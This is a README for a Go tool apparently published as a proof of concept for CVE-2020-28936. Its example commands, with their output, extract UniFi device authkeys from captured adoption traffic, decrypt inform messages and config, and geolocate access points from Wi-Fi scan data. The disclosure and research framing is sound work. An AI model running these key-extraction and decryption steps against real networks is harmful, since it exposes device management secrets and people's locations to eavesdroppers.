# pixiedust
Tool for exploring Ubiquiti UniFi inform traffic & proof of concept for [CVE-2020-28936](https://jade.wtf/words/unifi-l3inform-crypto).

## Building
1. You need [go](https://golang.org/). 
2. Clone git repo.
3. `go build`

## Usage

Extract keys from pcap of device adoption:
```
$ ./pixiedust -in unifi-fresh-usw.pcap -findkeys -message=false -logtostderr=false
0ee876dee74ff09c2e88387ecda39512
```

View inform sent from device (truncated here):
```
$ ./pixiedust -in unifi-fresh-usw.pcap  | jq | head -10
I1120 00:15:22.540899   13221 extraction.go:59] discovered key: 0ee876dee74ff09c2e88387ecda39512 for 10.0.1.48
{
  "architecture": "armv7l",
  "board_rev": 9,
  "bootid": 0,
  "bootrom_version": "usw-USHR3_v1.0.11.60-ga2f339b1",
  "cfgversion": "?",
  "default": true,
```

View config settings as applied to device (filtered to inform response because big output...):
```
$ ./pixiedust -in unifi-fresh-usw.pcap 2>&1|head -3|tail -2
{"_type":"setparam","mgmt_cfg":"capability=notif,fastapply-bg,notif-assoc-stat\nselfrun_guest_mode=pass\ncfgversion=bd4b0ca608dd9ca5\nled_enabled=false\nstun_url=stun://unifi:3478/\nmgmt_url=https://unifi:8443/manage/site/default\nauthkey=0ee876dee74ff09c2e88387ecda39512\nuse_aes_gcm=true\nreport_crash=true\n","server_time_in_utc":"1605818282220"}
I1120 00:11:43.163105   13121 extraction.go:59] discovered key: 0ee876dee74ff09c2e88387ecda39512 for 10.0.1.48
```

Geolocate WiFi APs by scan data (and suppress inform request/response so you don't miss it): 
```
$ export PD_MAPS_API_KEY=your_key_here
$ ./pixiedust -in locinform.pcap -locate -message=false
Device E063DA85AAC5 at 37.533223,-121.998402 (32.000000)
Device E063DA85AAC5 at 37.533154,-121.998379 (122.000000)
Device E063DA85AAC5 at 37.532886,-121.997456 (164.000000)
Device E063DA85AAC5 at 37.532843,-121.997286 (175.000000)
Device E063DA85AAC5 at 37.532932,-121.998446 (125.000000)
Device E063DA85AAC5 at 37.532959,-121.998441 (125.000000)
Device E063DA85AAC5 at 37.532993,-121.998439 (125.000000)
Device E063DA85AAC5 at 37.532977,-121.998488 (60.000000)
Device E063DA85AAC5 at 37.532987,-121.998509 (101.000000)
```
